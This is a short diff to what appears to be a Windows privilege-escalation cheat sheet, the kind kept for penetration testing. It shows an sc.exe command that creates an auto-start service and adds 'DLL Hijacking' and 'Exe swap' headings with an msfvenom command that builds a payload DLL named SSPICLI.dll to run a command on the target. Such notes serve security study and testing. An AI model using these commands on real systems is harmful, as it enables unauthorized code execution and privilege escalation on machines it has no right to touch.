@@ -438,8 +438,13 @@ head/tail
 .\sc.exe create puttyService binpath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
 ```
 
+#  DLL Hijacking
 
-
+#  Exe swap
+can only be done if able to rename executable
+```
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\admin\Desktop\whoami.txt' -f dll > SSPICLI.dll 
+```
 
 
 
